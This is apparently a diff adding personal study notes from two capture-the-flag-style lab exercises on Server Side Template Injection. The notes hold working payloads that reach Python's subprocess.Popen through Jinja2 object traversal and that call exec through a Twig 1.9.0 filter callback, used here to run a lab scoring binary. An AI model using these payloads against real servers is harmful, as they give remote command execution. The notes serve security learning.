@@ -1,0 +1,68 @@
+
+
+Server Side Template Injection
+===============================
+
+I don't know... If the notes are gonna be enough for this topic... I wanna dive deep into this one topic... Feels like so.
+
+01:
+	- It's not a concept that can be understood with 1 exercise or 2. So, gonna get back to this after a while.
+		- For this exercise, payload I used is the following.
+
+	{{''.__class__.mro()[2].__subclasses__()[233](["/usr/local/bin/score", "1345b487-2f63-49e9-97e4-e7059d8540eb"])}}
+
+	Alternatively, instead of using a list for arguments. You can run the command as one, and specify the shell=True parameter.
+
+	{{''.__class__.mro()[2].__subclasses__()[233]("/usr/local/bin/score 1345b487-2f63-49e9-97e4-e7059d8540eb", shell=True)}}
+
+	For more options read the docs of subprocess.
+
+Abstract of ex-01
+==================
+
+This exercise was inspired by the following Hackerone report: https://hackerone.com/reports/125980. In this exercise, the bug is located in the 404 error management.
+
+This report gives you the foundation to:
+
+    - Test {{'7'*7}}
+    - Get code execution:
+
+	{{''.__class__.mro()[1].__subclasses__()}} 
+
+Check the report carefully, as you can see that the `__` are hidden due to the processing of the data as Markdown in the initial report.
+
+You may need to change the value 1 to get the list of interesting functions. Once you get it, you will need to find one that will give you code execution. You can use the following payload to get access to <class 'subprocess.Popen'>:
+
+	{{''.__class__.mro()[1].__subclasses__()[X]}}
+
+		Where X is the integer you need to find, read the python docs to find which class is subpopen.
+			- Also note that there are some conditions that python's os module won't work... So keep an habit of using this module often.
+
+Finally, you can call this method using:
+
+	{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}
+
+Where:
+
+    X was found previously.
+    COMMAND is the command you want to run.
+
+Make sure you read the Python documentation for the popen to make sure you have get the right syntax for the command (or add the right option).
+
+
+02:
+
+	- This challenge covers the exploitation of a Server Side Template Injection in an old version of Twig (1.9.0).
+
+	- This issue can be used to gain code execution on the server. To get code execution you need to find a way to execute command using the functions offered by the template. Fortunately, the following code can be used:
+
+		{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
+
+	- Using this code, you should be able to score this exercise.
+	- Payload used: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('/usr/local/bin/score 1345b487-2f63-49e9-97e4-e7059d8540eb')}}
+
+
+Summary
+========
+
+	- TODO the summary
